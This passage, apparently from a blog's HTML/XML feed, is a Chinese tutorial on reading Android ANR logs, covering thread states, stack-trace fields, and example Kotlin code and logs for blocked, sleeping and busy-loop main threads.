/apex/com.android.art/lib64/libart.so (art::SignalCatcher::Run(void*)+264) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#09 pc 00000000000c1e40  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*)+208) (BuildId: 037ccd4f6c32456866be69c5a0a56591)</span></span><br><span class="line">  native: <span class="comment">#10 pc 0000000000054b50  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+64) (BuildId: 037ccd4f6c32456866be69c5a0a56591)</span></span><br><span class="line">  (no managed stack frames)</span><br><span class="line"><span class="string">&quot;main&quot;</span> prio=5 tid=1 Waiting</span><br><span class="line">  | group=<span class="string">&quot;main&quot;</span> sCount=1 ucsCount=0 flags=1 obj=0x720c41e8 self=0xb400007dceb13380</span><br><span class="line">  | sysTid=17376 <span class="built_in">nice</span>=0 cgrp=default <span class="built_in">sched</span>=0/0 handle=0x7f1ae4f4f8</span><br><span class="line">  | state=S schedstat=( 520024534 625550234 691 ) utm=28 stm=23 core=5 HZ=100</span><br><span class="line">  | stack=0x7fea717000-0x7fea719000 stackSize=8188KB</span><br><span class="line">  | held mutexes=</span><br><span class="line">  at jdk.internal.misc.Unsafe.park(Native method)</span><br><span class="line">  - waiting on an unknown object</span><br><span class="line">  at java.util.concurrent.locks.LockSupport.park(LockSupport.java:194)</span><br><span class="line">  at aidy.get(PG:5)</span><br><span class="line">  at aihp.c(PG:1)</span><br><span class="line">  at gdu.az(PG:2)</span><br><span class="line">  at gge.j(PG:33)</span><br><span class="line">  - locked &lt;0x07048dde&gt; (a com.google.android.finsky.application.classic.ClassicApplication)</span><br><span class="line">  at gge.onCreate(PG:3)</span><br><span class="line">  at android.app.Instrumentation.callApplicationOnCreate(Instrumentation.java:1266)</span><br><span class="line">  at android.app.ActivityThread.handleBindApplication(ActivityThread.java:6826)</span><br><span class="line">  at android.app.ActivityThread.-$$Nest<span class="variable">$mhandleBindApplication</span>(unavailable:0)</span><br><span class="line">  at android.app.ActivityThread<span class="variable">$H</span>.handleMessage(ActivityThread.java:2171)</span><br><span class="line">  at android.os.Handler.dispatchMessage(Handler.java:106)</span><br><span class="line">  at android.os.Looper.loopOnce(Looper.java:201)</span><br><span class="line">  at android.os.Looper.loop(Looper.java:288)</span><br><span class="line">  at android.app.ActivityThread.main(ActivityThread.java:7941)</span><br><span class="line">  at java.lang.reflect.Method.invoke(Native method)</span><br><span class="line">  at com.android.internal.os.RuntimeInit<span class="variable">$MethodAndArgsCaller</span>.run(RuntimeInit.java:569)</span><br><span class="line">  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1015)</span><br><span class="line"> ...</span><br><span class="line"><span class="string">&quot;Jit thread pool worker thread 0&quot;</span> daemon prio=5 tid=8 Native</span><br><span class="line">  | group=<span class="string">&quot;system&quot;</span> sCount=1 ucsCount=0 flags=1 obj=0x132c09d0 self=0xb400007dceb43e40</span><br><span class="line">  | sysTid=17389 <span class="built_in">nice</span>=9 cgrp=default <span class="built_in">sched</span>=0/0 handle=0x7c478e1cb0</span><br><span class="line">  | state=S schedstat=( 46231998 254143847 68 ) utm=3 stm=0 core=7 HZ=100</span><br><span class="line">  | stack=0x7c477e2000-0x7c477e4000 stackSize=1023KB</span><br><span class="line">  | held mutexes=</span><br><span class="line">  native: <span class="comment">#00 pc 000000000004f66c  /apex/com.android.runtime/lib64/bionic/libc.so (syscall+28) (BuildId: 037ccd4f6c32456866be69c5a0a56591)</span></span><br><span class="line">  native: <span class="comment">#01 pc 000000000047cc80  /apex/com.android.art/lib64/libart.so (art::ConditionVariable::WaitHoldingLocks(art::Thread*)+140) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#02 pc 000000000047cb18  /apex/com.android.art/lib64/libart.so (art::ThreadPool::GetTask(art::Thread*)+120) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#03 pc 0000000000619810  /apex/com.android.art/lib64/libart.so (art::ThreadPoolWorker::Run()+136) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#04 pc 00000000006196f0  /apex/com.android.art/lib64/libart.so (art::ThreadPoolWorker::Callback(void*)+160) (BuildId: 56e704c544e6c624201be2ab4933e853)</span></span><br><span class="line">  native: <span class="comment">#05 pc 00000000000c1e40  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*)+208) (BuildId: 037ccd4f6c32456866be69c5a0a56591)</span></span><br><span class="line">  native: <span class="comment">#06 pc 0000000000054b50  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+64) (BuildId: 037ccd4f6c32456866be69c5a0a56591)</span></span><br><span class="line">  (no managed stack frames)</span><br><span class="line">...</span><br><span class="line">----- end 17376 -----</span><br></pre></td></tr></table></figure><p>如上截图中，有三个线程，一个是 <strong>Signal Catcher</strong> 线程，一个是 <strong>main</strong> 线程，一个是 <strong>Jit thread pool worker thread 0</strong> ，他们的线程状态分别是 <strong>Runnable</strong> 、 <strong>blocked</strong> 和 <strong>native</strong> 状态。<br>而在 Java 中，线程状态有6种，如下所示：</p><ul><li><strong>NEW - 创建状态</strong>：当我们new一个Thread的时候，线程就处于创建状态；</li><li><strong>RUNNABLE - 就绪或运行状态</strong>：当我们调用线程的 start() 方法，线程就会进入该状态；</li></ul><blockquote><p>另外，还有两种情况也会使线程进入就绪状态：</p></blockquote><blockquote><ul><li>线程之前处于阻塞状态，如果阻塞解除了，也会进入就绪状态</li><li>线程之前处于运行状态，如果执行了 Thread.yield() 方法，则线程会进入就绪状态</li></ul></blockquote><ul><li><strong>BLOCKED - 阻塞状态</strong>：该状态下，线程正在阻塞等待某个锁。</li><li><strong>WATING - 等待状态</strong>：当调用了以下某一个方法，线程就会处于等待状态：</li></ul><blockquote><p>Object.wait<br>Thread.join<br>LockSupport.park<br>处于等待状态的线程正在等待另一个线程执行特定操作，例如：</p></blockquote><blockquote><ul><li>在一个对象上调用了 Object.wait() 的线程正在等待另一个线程调用 Object.notify() 或 Object.notifyAll() 。</li><li>已调用  Thread.join() 的线程正在等待指定线程终止。</li></ul></blockquote><ul><li><strong>TIMED_WAITING - 定时等待状态</strong>：指定等待时间的等待状态，当调用以下具有指定正等待时间的方法之一，线程就会处于定时等待状态：</li></ul><blockquote><p>Thread.sleep(long millis)<br>Object.wait(long timeout)<br>Thread.join(long millis)<br>LockSupport.parkNanos(long nanos)<br>LockSupport .parkUntil(long deadline)</p></blockquote><ul><li><strong>TERMINATED - 终止状态</strong>：终止状态，线程已完成执行就会进入此状态。</li></ul><hr><p>那么，上述日志中的 <strong>native</strong> 状态是什么呢？<br>其实该状态是 cpp 代码中定义的线程状态，他跟 java 定义的线程状态关系如下：</p><table><thead><tr><th>java thread 状态</th><th>cpp thread状态</th><th>说明</th></tr></thead><tbody><tr><td>TERMINATED</td><td>ZOMBIE</td><td>线程死亡，终止运行</td></tr><tr><td>RUNNABLE</td><td>RUNNING/RUNNABLE</td><td>线程可运行或正在运行</td></tr><tr><td>TIMED_WAITING</td><td>TIMED_WAIT</td><td>执行了带有超时参数的wait, sleep或join函数</td></tr><tr><td>BLOCKED</td><td>MONITOR</td><td>线程阻塞，等待获取对象锁</td></tr><tr><td>WAITING</td><td>WAIT</td><td>执行了无超时参数的wait函数</td></tr><tr><td>NEW</td><td>INITIALIZING</td><td>新建，正在初始化，为其分配资源</td></tr><tr><td>NEW</td><td>STARTING</td><td>新建，正在启动</td></tr><tr><td>RUNNABLE</td><td>NATIVE</td><td>正在执行JNI本地函数</td></tr><tr><td>WAITING</td><td>VMWAIT</td><td>正在等待VM资源</td></tr><tr><td>RUNNABLE</td><td>SUSPENDED</td><td>线程暂停，通常是由于GC或debug被暂停</td></tr><tr><td></td><td>UNKNOWN</td><td>未知状态</td></tr></tbody></table><p>由上可知，<strong>native</strong> 状态对应的 <strong>java</strong> 线程状态是 <strong>runnable</strong> 状态。<br>堆栈信息是我们分析 <strong>ANR</strong> 的第一个重要的信息，一般来说：</p><ul><li>主线程处于 BLOCK / WAITING / TIMEWAITING 状态，基本上是函数阻塞导致的 anr</li><li>若主线程无异常，则应该排查 CPU 负载和内存环境等其他因素</li></ul><p>另外，在 anr 日志中，还有一些常见参数，他们的含义如下：</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td><strong>main</strong></td><td>main标识是主线程，如果是线程，那么命名成“Thread-X”的格式,x表示线程id,逐步递增。</td></tr><tr><td><strong>prio</strong></td><td>线程优先级,默认是5</td></tr><tr><td><strong>tid</strong></td><td>tid不是线程的id，是线程唯一标识ID</td></tr><tr><td><strong>group</strong></td><td>是线程组名称</td></tr><tr><td><strong>sCount</strong></td><td>该线程被挂起的次数</td></tr><tr><td><strong>dsCount</strong></td><td>是线程被调试器挂起的次数</td></tr><tr><td><strong>obj</strong></td><td>对象地址</td></tr><tr><td><strong>self</strong></td><td>该线程Native的地址</td></tr><tr><td><strong>sysTid</strong></td><td>是线程号(主线程的线程号和进程号相同)</td></tr><tr><td><strong>nice</strong></td><td>是线程的调度优先级</td></tr><tr><td><strong>sched</strong></td><td>分别标志了线程的调度策略和优先级</td></tr><tr><td><strong>cgrp</strong></td><td>调度归属组</td></tr><tr><td><strong>handle</strong></td><td>线程处理函数的地址</td></tr><tr><td><strong>state</strong></td><td>是调度状态</td></tr><tr><td><strong>schedstat</strong></td><td>从 /proc/[pid]/task/[tid]/schedstat读出，三个值分别表示线程在cpu上执行的时间、线程的等待时间和线程执行的时间片长度，不支持这项信息的三个值都是0；</td></tr><tr><td><strong>utm</strong></td><td>是线程用户态下使用的时间值(单位是jiffies）</td></tr><tr><td><strong>stm</strong></td><td>是内核态下的调度时间值</td></tr><tr><td><strong>core</strong></td><td>是最后执行这个线程的cpu核的序号</td></tr></tbody></table><h4 id="三、分析"><a href="#三、分析" class="headerlink" title="三、分析"></a>三、分析</h4><p>1.通过在 <strong>events_log</strong> 中检索 <strong>am_anr</strong> 关键字，就可以找到发生ANR的进程，譬如以下日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10-16 00:48:27 820 907 I am_anr: [0,29533,com.android.systemui,1082670605,Broadcast of Intent &#123; act=android.intent.action.TIME_TICK flg=0x50000114 (has extras) &#125;]</span><br></pre></td></tr></table></figure><p>表示在 <strong>10-16 00:48:27</strong> 这个时刻，<strong>PID</strong> 为 <strong>29533</strong> 进程发生了 ANR，进程名是 <strong>com.android.systemui</strong>。<br>接下来可以在  <strong>sys_log</strong> 检索 <strong>ANR in</strong> 关键字，找到发生 <strong>ANR</strong> 前后的 <strong>CPU</strong> 使用情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">10-16 00:50:10 820 907 E ActivityManager: ANR <span class="keyword">in</span> com.android.systemui, time=130090695</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager: Reason: Broadcast of Intent &#123; act=android.intent.action.TIME_TICK flg=0x50000114 (has extras) &#125;</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager: Load: 30.4 / 22.34 / 19.94</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager: Android time :[2015-10-16 00:50:05.76] [130191,266]</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager: CPU usage from 6753ms to -4ms ago:</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   47% 320/netd: 3.1% user + 44% kernel / faults: 14886 minor 3 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   15% 10007/com.sohu.sohuvideo: 2.8% user + 12% kernel / faults: 1144 minor</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   13% 10654/hif_thread: 0% user + 13% kernel</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   11% 175/mmcqd/0: 0% user + 11% kernel</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   5.1% 12165/app_process: 1.6% user + 3.5% kernel / faults: 9703 minor 540 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   3.3% 29533/com.android.systemui: 2.6% user + 0.7% kernel / faults: 8402 minor 343 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   3.2% 820/system_server: 0.8% user + 2.3% kernel / faults: 5120 minor 523 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   2.5% 11817/com.netease.pomelo.push.l.messageservice_V2: 0.7% user + 1.7% kernel / faults: 7728 minor 687 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   1.6% 11887/com.android.email: 0.5% user + 1% kernel / faults: 6259 minor 587 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   1.4% 11854/com.android.settings: 0.7% user + 0.7% kernel / faults: 5404 minor 471 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   1.4% 11869/android.process.acore: 0.7% user + 0.7% kernel / faults: 6131 minor 561 major</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:   1.3% 11860/com.tencent.mobileqq: 0.1% user + 1.1% kernel / faults: 5542 minor 470 major</span><br><span class="line">...</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:  +0% 12832/cat: 0% user + 0% kernel</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager:  +0% 13211/zygote64: 0% user + 0% kernel</span><br><span class="line">10-16 00:50:10 820 907 E ActivityManager: 87% TOTAL: 3% user + 18% kernel + 64% iowait + 0.5% softirq</span><br></pre></td></tr></table></figure><p>这一段日志它包含的信息量非常多：</p><ul><li><strong>发生 ANR 的时间</strong>：events_log 中，ANR 的时间是 00：48：27，因为 AMS.appNotResponding() 首先会打印 events_log，然后再打印 syst_log， 所以，在 syst_log 中，找到ANR的时间是 00:50:10。可以从这个时间点之前的日志中，还原ANR出现时系统的运行状态。</li><li><strong>打印ANR日志的进程</strong>：ANR日志都是在 system_server 进程的AMS线程打印的，在events_log和sys_log中，都能看到 820 和 907， 所以system_server的PID是 802，AMS 线程的 TID 是 907。ANR的监测机制实现在 AMS线程，分析一些受系统影响的ANR，需要知道system_server进程的运行状态。</li><li><strong>发生ANR的进程</strong>：ANR in关键字就表明了当前ANR的进程是com.android.system.ui，通过events_log，知道进程的PID是 29533。</li><li><strong>CPU使用统计时间段</strong>：CPU usage from XX to XX ago关键字表明了这是在ANR发生之前一段时间内的CPU统计。 类似的还有CPU usage from XX to XX after关键字，表明是ANR发生之后一段时间内的CPU统计。</li><li><strong>发生ANR的原因</strong>：Reason关键字表明了当前发生ANR的原因是，处理TIME_TICK广播消息超时。 隐含的意思是TIME_TICK是一个串行广播消息，在 29533 的主线程中，执行BroadcastReceiver.onReceive()方法已经超过10秒。（也有可能时其他原因，导致systemui进程分配不到CPU时间，从而主线程处理广播消息超时，发生了ANR。）</li></ul><p><strong>2.Blocked——ANR</strong></p><p><strong>Blocked</strong>关键字，在 ANR 日志里可以直接搜索 <strong>Blocked</strong>，看个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;main&quot;</span> prio=5 tid=1 Blocked</span><br><span class="line">  | group=<span class="string">&quot;main&quot;</span> sCount=1 dsCount=0 obj=0x75bd5818 self=0x7f8549a000</span><br><span class="line">  | sysTid=29533 <span class="built_in">nice</span>=0 cgrp=bg_non_interactive <span class="built_in">sched</span>=0/0 handle=0x7f894bbe58</span><br><span class="line">  | state=S schedstat=( 289080040422 93461978317 904874 ) utm=20599 stm=8309 core=0 HZ=100</span><br><span class="line">  | stack=0x7fdffda000-0x7fdffdc000 stackSize=8MB</span><br><span class="line">  | held mutexes=</span><br><span class="line">  at com.mediatek.anrappmanager.MessageLogger.println(SourceFile:77)</span><br><span class="line">  - waiting to lock &lt;0x26b337a3&gt; (a com.mediatek.anrappmanager.MessageLogger) held by thread 49</span><br><span class="line">  at android.os.Looper.loop(Looper.java:195)</span><br><span class="line">  at android.app.ActivityThread.main(ActivityThread.java:5718)</span><br><span class="line">  at java.lang.reflect.Method.invoke!(Native method)</span><br><span class="line">  at java.lang.reflect.Method.invoke(Method.java:372)</span><br><span class="line">  at com.android.internal.os.ZygoteInit<span class="variable">$MethodAndArgsCaller</span>.run(ZygoteInit.java:975)</span><br><span class="line">  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:770)</span><br></pre></td></tr></table></figure><p>可以发现主线程 <strong>Blocked</strong>，并且这里有一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- waiting to lock &lt;0x26b337a3&gt; (a com.mediatek.anrappmanager.MessageLogger) held by thread 49</span><br></pre></td></tr></table></figure><p>其含义就是，主线程正在被 block， 其正在等待 线程49 释放锁，最终因此导致出现了 ANR。<br>可以接着搜关键字 <strong>tid=49</strong>，如果简单的话一般会是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;xxxThread&quot;</span> prio=5 tid=49 Sleeping</span><br></pre></td></tr></table></figure><p>基本也可以定位到问题。</p><p><strong>3.Slepping——ANR</strong></p><p><strong>Slepping</strong>关键字，在 ANR 日志里可以直接搜索 <strong>Slepping</strong>，看个例子：<br>MainActivity 代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;   </span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContentView(R.layout.activity_main)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 点击睡眠 10s</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    fun <span class="title function_">clickToSleep</span><span class="params">(view: View)</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">10_000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当点击按钮睡眠 10s 后，我们左滑或者点击返回键退出 MainActivity（由于主线程正在睡眠，所以此时是无法退出成功的），等待一段时间，系统将会弹出 ANR 弹窗。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;main&quot;</span> prio=5 tid=1 Sleeping</span><br><span class="line">  | group=<span class="string">&quot;main&quot;</span> sCount=1 dsCount=0 flags=1 obj=0x72e0ee78 self=0x79aafbcc00</span><br><span class="line">  | sysTid=16356 <span class="built_in">nice</span>=-10 cgrp=default <span class="built_in">sched</span>=0/0 handle=0x79ac524ed0</span><br><span class="line">  | state=S schedstat=( 1075827038 33414740 291 ) utm=93 stm=14 core=2 HZ=100</span><br><span class="line">  | stack=0x7fe35ed000-0x7fe35ef000 stackSize=8192KB</span><br><span class="line">  | held mutexes=</span><br><span class="line">  at java.lang.Thread.<span class="built_in">sleep</span>(Native method)</span><br><span class="line">  - sleeping on &lt;0x04fbafa5&gt; (a java.lang.Object)</span><br><span class="line">  at java.lang.Thread.<span class="built_in">sleep</span>(Thread.java:440)</span><br><span class="line">  - locked &lt;0x04fbafa5&gt; (a java.lang.Object)</span><br><span class="line">  at java.lang.Thread.<span class="built_in">sleep</span>(Thread.java:356)</span><br><span class="line">  at com.example.demoproject.view.MainActivity.clickToSleep(MainActivity.kt:57)</span><br><span class="line">  at java.lang.reflect.Method.invoke(Native method)</span><br><span class="line">  at androidx.appcompat.app.AppCompatViewInflater<span class="variable">$DeclaredOnClickListener</span>.onClick(AppCompatViewInflater.java:441)</span><br><span class="line">  at android.view.View.performClick(View.java:7259)</span><br><span class="line">  at com.google.android.material.button.MaterialButton.performClick(MaterialButton.java:1194)</span><br><span class="line">  at android.view.View.performClickInternal(View.java:7236)</span><br><span class="line">  at android.view.View.access<span class="variable">$3600</span>(View.java:801)</span><br><span class="line">  at android.view.View<span class="variable">$PerformClick</span>.run(View.java:27896)</span><br><span class="line">  at android.os.Handler.handleCallback(Handler.java:883)</span><br><span class="line">  at android.os.Handler.dispatchMessage(Handler.java:100)</span><br><span class="line">  at android.os.Looper.loop(Looper.java:214)</span><br><span class="line">  at android.app.ActivityThread.main(ActivityThread.java:7397)</span><br><span class="line">  at java.lang.reflect.Method.invoke(Native method)</span><br><span class="line">  at com.android.internal.os.RuntimeInit<span class="variable">$MethodAndArgsCaller</span>.run(RuntimeInit.java:492)</span><br><span class="line">  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:935)</span><br></pre></td></tr></table></figure><p>从堆栈信息中也很容易发现，在执行到 <strong>MainActivity.clickToSleep</strong> 方法时，线程进行了睡眠，最终导致 ANR。</p><p><strong>4.耗时或死循环方法</strong></p><p>例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContentView(R.layout.activity_main)</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    fun <span class="title function_">click</span><span class="params">(view: View)</span> &#123;</span><br><span class="line">        doSomething()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> fun <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 注意这里死循环</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            Log.i(<span class="string">&quot;testLog&quot;</span>, <span class="string">&quot;doSomething.. 当前线程名称=$&#123;Thread.currentThread().name&#125; 线程id=$&#123;Thread.currentThread().id&#125;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们点击按钮时，会在主线程通过一个死循环不断打印 log，因此 <strong>doSomething()</strong> 方法我们可以认为是一个耗时方法，点击按钮后，我们左滑或者点击返回键退出 MainActivity（由于主线程正在忙碌中，所以此时是无法退出成功的），等待一段时间，系统将会弹出 ANR 弹窗。<br>ANR日志如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">----- pid 13231 at 2022-06-17 14:23:41 -----</span><br><span class="line">Cmd line: com.example.demoproject</span><br><span class="line">...</span><br><span class="line"><span class="string">&quot;main&quot;</span> prio=5 tid=1 Runnable</span><br><span class="line">  | group=<span class="string">&quot;main&quot;</span> sCount=0 dsCount=0 flags=0 obj=0x72b20e78 self=0x77fe5a6c00</span><br><span class="line">  | sysTid=13231 <span class="built_in">nice</span>=-10 cgrp=default <span class="built_in">sched</span>=0/0 handle=0x77ffb0eed0</span><br><span class="line">  | state=R schedstat=( 31694533124 58819622 723 ) utm=1310 stm=1859 core=5 HZ=100</span><br><span class="line">  | stack=0x7fdc2b7000-0x7fdc2b9000 stackSize=8192KB</span><br><span class="line">  | held mutexes= <span class="string">&quot;mutator lock&quot;</span>(shared held)</span><br><span class="line">  native: <span class="comment">#00 pc 00000000004108e8  /apex/com.android.runtime/lib64/libart.so (art::DumpNativeStack(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt;&gt;&amp;, int, BacktraceMap*, char const*, art::ArtMethod*, void*, bool)+140)</span></span><br><span class="line">  native: <span class="comment">#01 pc 00000000004f8040  /apex/com.android.runtime/lib64/libart.so (art::Thread::DumpStack(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt;&gt;&amp;, bool, BacktraceMap*, bool) const+512)</span></span><br><span class="line">  native: <span class="comment">#02 pc 000000000051297c  /apex/com.android.runtime/lib64/libart.so (art::DumpCheckpoint::Run(art::Thread*)+828)</span></span><br><span class="line">  native: <span class="comment">#03 pc 00000000004f8d4c  /apex/com.android.runtime/lib64/libart.so (art::Thread::RunCheckpointFunction()+176)</span></span><br><span class="line">  native: <span class="comment">#04 pc 00000000003713fc  /apex/com.android.runtime/lib64/libart.so (art::(anonymous namespace)::CheckJNI::ReleaseStringCharsInternal(char const*, _JNIEnv*, _jstring*, void const*, bool, bool)+1356)</span></span><br><span class="line">  native: <span class="comment">#05 pc 00000000001507cc  /system/lib64/libandroid_runtime.so (android::android_util_Log_println_native(_JNIEnv*, _jobject*, int, int, _jstring*, _jstring*)+232)</span></span><br><span class="line">  at android.util.Log.println_native(Native method)</span><br><span class="line">  at android.util.Log.i(Log.java:176)</span><br><span class="line">  at com.example.demoproject.view.MainActivity.doSomething(MainActivity.kt:52)</span><br><span class="line">  at com.example.demoproject.view.MainActivity.click2(MainActivity.kt:36)</span><br><span class="line">  at java.lang.reflect.Method.invoke(Native method)</span><br><span class="line">  at androidx.appcompat.app.AppCompatViewInflater<span class="variable">$DeclaredOnClickListener</span>.onClick(AppCompatViewInflater.java:441)</span><br><span class="line">  at android.view.View.performClick(View.java:7259)</span><br><span class="line">  at com.google.android.material.button.MaterialButton.performClick(MaterialButton.java:1194)</span><br><span class="line">  at android.view.View.performClickInternal(View.java:7236)</span><br><span class="line">  at android.view.View.access<span class="variable">$3600</span>(View.java:801)</span><br><span class="line">  at android.view.View<span class="variable">$PerformClick</span>.run(View.java:27896)</span><br><span class="line">  at android.os.Handler.handleCallback(Handler.java:883)</span><br><span class="line">  at android.os.Handler.dispatchMessage(Handler.java:100)</span><br><span class="line">  at android.os.Looper.loop(Looper.java:214)</span><br><span class="line">  at android.app.ActivityThread.main(ActivityThread.java:7397)</span><br><span class="line">  at java.lang.reflect.Method.invoke(Native method)</span><br><span class="line">  at com.android.internal.os.RuntimeInit<span class="variable">$MethodAndArgsCaller</span>.run(RuntimeInit.java:492)</span><br><span class="line">  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:935)</span><br><span class="line">...</span><br><span class="line">----- end 16808 -----</span><br></pre></td></tr></table></figure><p>发现主线程正处于 Runnable 状态，并不是处于空闲状态，堆栈信息中有一行关键日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at com.example.demoproject.view.MainActivity.doSomething(MainActivity.kt:52)</span><br></pre></td></tr></table></figure><p>各关键字：am_anr、ANR in、Reason、Blocked、Slepping。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android ART编译模式解析</title>
      <link href="/2024/01/14/2024-01-14/"/>
      <url>/2024/01/14/2024-01-14/</url>
      
